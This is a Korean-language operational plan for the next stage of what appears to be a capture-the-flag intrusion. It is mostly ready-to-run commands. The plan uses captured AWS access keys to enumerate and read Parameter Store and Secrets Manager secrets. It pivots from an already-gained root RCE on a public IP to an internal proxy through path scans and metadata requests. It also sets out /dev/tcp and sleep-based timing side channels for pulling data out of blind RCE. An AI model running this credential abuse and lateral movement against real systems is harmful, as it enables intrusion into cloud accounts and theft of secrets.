# Stage 4 진입 — SAST 기반 2가지 추천 방안

## 현황
- **확보**: AWS 자격증명 (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
- **실패**: S3 다운로드 (권한/존재 여부 불명)
- **미확인**: 내부 프록시(10.0.1.10:8080), MySQL DB 접근

---

## 방안 A: AWS 서비스 직접 접근 (낮은 난이도)

### 목표
S3 대신 **AWS Systems Manager Parameter Store** 또는 **Secrets Manager**에서 Stage 4 정보 추출

### 이유
- S3 권한이 없을 수 있지만, 다른 AWS 서비스는 사용 가능할 수 있음
- Parameter Store/Secrets는 일반적으로 배포 설정, DB 비밀번호, API 키 저장
- Stage 4 엔드포인트나 자격증명이 여기 저장되었을 가능성 높음

### 실행 명령
```bash
# 1. STS로 자격증명 유효성 확인
aws sts get-caller-identity \
  --access-key-id AKIA[REDACTED-ACCESS-KEY] \
  --secret-access-key [REDACTED-SECRET-KEY] \
  --region us-east-1

# 2. Parameter Store 조회 (stage/stage4 관련)
aws ssm get-parameters-by-path \
  --path /stage4 \
  --recursive \
  --region us-east-1 \
  --access-key-id AKIA[REDACTED-ACCESS-KEY] \
  --secret-access-key [REDACTED-SECRET-KEY]

# 3. Secrets Manager 조회
aws secretsmanager list-secrets \
  --region us-east-1 \
  --access-key-id AKIA[REDACTED-ACCESS-KEY] \
  --secret-access-key [REDACTED-SECRET-KEY]

# 특정 시크릿 조회
aws secretsmanager get-secret-value \
  --secret-id stage4-credentials \
  --region us-east-1

# 4. 모든 S3 버킷 나열 (권한 확인)
aws s3 ls --region us-east-1
```

### 기대 결과
```
✓ Stage 4 URL/엔드포인트
✓ 다음 단계 자격증명
✓ API 키 또는 토큰
✓ EC2/RDS 메타데이터
```

---

## 방안 B: 내부 프록시 직접 접근 (중간 난이도)

### 목표
root RCE를 사용해 **내부 네트워크(10.0.1.10:8080)에 직접 접근**

### 이유
- Stage 3(13.125.104.131)에서 root 권한 이미 확보 (E17c)
- 내부 프록시는 외부에서 접근 불가능하지만 서버에서는 접근 가능
- Stage 4 플래그/정보가 API로 직접 제공될 가능성 높음

### 실행 명령
```bash
# 1. 내부 프록시 연결 테스트
curl -v http://10.0.1.10:8080/ --max-time 5

# 2. 경로 스캔
for path in /flag /stage4 /api /admin /export; do
  echo "Testing $path..."; 
  curl -s http://10.0.1.10:8080$path | head -20
done

# 3. POST 요청 (Stage 3 정보 제출)
curl -X POST http://10.0.1.10:8080/stage4 \
  -H "Content-Type: application/json" \
  -d '{"stage": 3, "flag": "HTB{...}", "credentials": {"aws_key": "..."}}'

# 4. 메타데이터 요청 (AWS EC2 메타데이터 서버 패턴)
curl http://10.0.1.10:8080/metadata/
curl http://10.0.1.10:8080/api/v1/metadata/
```

### 타이밍 프로빙 (블라인드 RCE 환경)
```bash
# 연결 가능 여부
if timeout 2 bash -c '>/dev/tcp/10.0.1.10/8080' 2>/dev/null; then 
  sleep 3  # Success
else 
  sleep 6  # Failed
fi

# 경로 존재 확인
if curl -s http://10.0.1.10:8080/flag -o /dev/null -w "%{http_code}" | grep -q 200; then
  sleep 3  # Found
else
  sleep 6  # Not found
fi

# 응답 크기로 판단
SIZE=$(curl -s http://10.0.1.10:8080/api/ | wc -c)
if [ $SIZE -gt 100 ]; then
  sleep 3
else
  sleep 6
fi
```

### 기대 결과
```
✓ 10.0.1.10에서 HTTP 응답 수집
✓ Stage 4 플래그 직접 획득
✓ 또는 다음 단계 정보/자격증명
```

---

## 의사 결정 트리

```
Question 1: AWS 자격증명이 여전히 유효한가?
  → YES → 방안 A 시도 (5분)
  → NO  → 방안 B로 이동

Question 2: 내부 프록시(10.0.1.10:8080)에 연결되는가?
  → YES → 방안 B 실행 (10분)
  → NO  → 다른 내부 IP 발견? (스캔)

Question 3: 어느 쪽이든 성공하는가?
  → NO  → 타이밍 사이드채널로 느리지만 확실하게 추출
```

---

## 준비물

### 방안 A용
- AWS CLI (또는 boto3)
- AWS 자격증명 설정

### 방안 B용
- curl 또는 wget
- 서버 내 root RCE (이미 확보됨)

---

## 추천 순서

1. **(가장 빠름)** 방안 A: AWS 서비스 조회 (5~10분)
2. **(실패 시)** 방안 B: 내부 프록시 접근 (10~20분)
3. **(마지막 수단)** 타이밍 사이드채널 (1시간+)

---

## 다음 실행 명령

```bash
# 먼저 AWS 자격증명으로 Parameter Store 확인
export AWS_ACCESS_KEY_ID=AKIA[REDACTED-ACCESS-KEY]
export AWS_SECRET_ACCESS_KEY=[REDACTED-SECRET-KEY]
export AWS_DEFAULT_REGION=us-east-1

# STS 확인
aws sts get-caller-identity

# Parameter Store 확인
aws ssm describe-parameters | jq -r '.Parameters[] | .Name' | grep -i stage
aws ssm get-parameters-by-path --path /stage --recursive

# Secrets 확인
aws secretsmanager list-secrets
```
